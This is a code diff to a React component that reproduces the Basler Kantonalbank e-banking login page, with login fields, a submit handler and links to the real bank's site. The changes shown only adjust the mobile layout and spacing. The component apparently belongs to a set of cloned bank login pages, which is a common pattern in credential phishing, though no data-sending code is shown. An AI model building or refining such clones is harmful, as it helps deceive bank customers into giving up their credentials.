@@ -252,10 +252,21 @@ const ChBaslerKantonalbank = () => {
           {/* Above the fold — fills viewport */}
           <section className="min-h-[calc(100vh-4rem)] flex">
             <div className="max-w-[1280px] w-full mx-auto px-6 md:px-32 pt-10 md:pt-14 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
-              {/* Left column */}
               <div>
                 <h1 className="text-[32px] md:text-[44px] font-normal leading-[1.05]">{t.title}</h1>
                 <p className="text-[18px] mt-6 mb-12 md:mb-14">{t.subtitle}</p>
+
+                {/* Mobile Info Card */}
+                <div className="lg:hidden mb-12">
+                  <div className="p-7 text-white shadow-[0_4px_20px_rgba(0,0,0,0.15)]" style={{ backgroundColor: GREEN }}>
+                    <div className="flex items-center gap-3 mb-3">
+                      <Info size={26} strokeWidth={1.5} />
+                      <h3 className="text-[22px] md:text-[24px] font-normal">{t.info}</h3>
+                    </div>
+                    <p className="text-[15px] leading-[1.5]">{t.infoText}</p>
+                    <p className="text-[15px] mt-4">{t.infoThanks}</p>
+                  </div>
+                </div>
 
                 <div className="space-y-6">
                   <Field
@@ -283,10 +294,10 @@ const ChBaslerKantonalbank = () => {
                   <a href="https://www.bkb.ch/rechtliche-hinweise" target="_blank" rel="noopener noreferrer" className="underline">{t.legalLink}</a>.
                 </p>
 
-                <div className="flex items-center gap-6 flex-wrap">
+                <div className="flex flex-col-reverse items-stretch gap-3 md:flex-row md:items-center md:gap-6 md:flex-wrap">
                   <button
                     onClick={handleSubmit}
-                    className="px-10 py-3 text-[15px] transition-colors"
+                    className="w-full md:w-auto px-10 py-3 text-[15px] transition-colors"
                     style={{
                       backgroundColor: formFilled ? BTN_ACTIVE_BG : BTN_IDLE_BG,
                       color: formFilled ? "#000000" : BTN_IDLE_TEXT,
@@ -301,17 +312,17 @@ const ChBaslerKantonalbank = () => {
                   >
                     {t.login}
                   </button>
-                  <a href="https://www.bkb.ch/de/login-hilfe" target="_blank" rel="noopener noreferrer" className="underline text-[15px]">{t.loginProblem}</a>
+                  <a href="https://www.bkb.ch/de/login-hilfe" target="_blank" rel="noopener noreferrer" className="underline text-[13px] md:text-[15px] self-start">{t.loginProblem}</a>
                 </div>
 
-                <div className="mt-20">
+                <div className="mt-28 md:mt-20">
                   <h2 className="text-[24px] md:text-[28px] font-light mb-4">{t.noAccess}</h2>
                   <a href="https://www.bkb.ch/ebanking-beantragen" target="_blank" rel="noopener noreferrer" className="underline text-[15px]">{t.request}</a>
                 </div>
               </div>
 
-              {/* Right column — Wichtige Information */}
-              <div>
+              {/* Right column — Wichtige Information (Desktop) */}
+              <div className="hidden lg:block">
                 <div className="p-7 text-white shadow-[0_4px_20px_rgba(0,0,0,0.15)]" style={{ backgroundColor: GREEN }}>
                   <div className="flex items-center gap-3 mb-3">
                     <Info size={26} strokeWidth={1.5} />
@@ -346,7 +357,7 @@ const ChBaslerKantonalbank = () => {
         {/* Footer */}
         <footer className="border-t border-gray-300 mt-16">
           <div className="max-w-[1280px] mx-auto px-6 md:px-32 py-8 text-[14px]">
-            <div className="flex flex-col md:flex-row md:gap-10 gap-3 mb-4">
+            <div className="flex flex-col md:flex-row md:gap-10 gap-3 mb-8 md:mb-4">
               <a href="https://www.bkb.ch/de/die-basler-kantonalbank/kontakt-services/hilfe-und-support/e-banking-faq" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f1}</a>
               <a href="https://www.bkb.ch/de/privatkunden/konten-und-karten/digital-banking/e-banking-fuer-private" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f2}</a>
               <a href="https://www.bkb.ch/de/privatkunden/konten-und-karten/digital-banking/e-banking-fuer-private" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f3}</a>
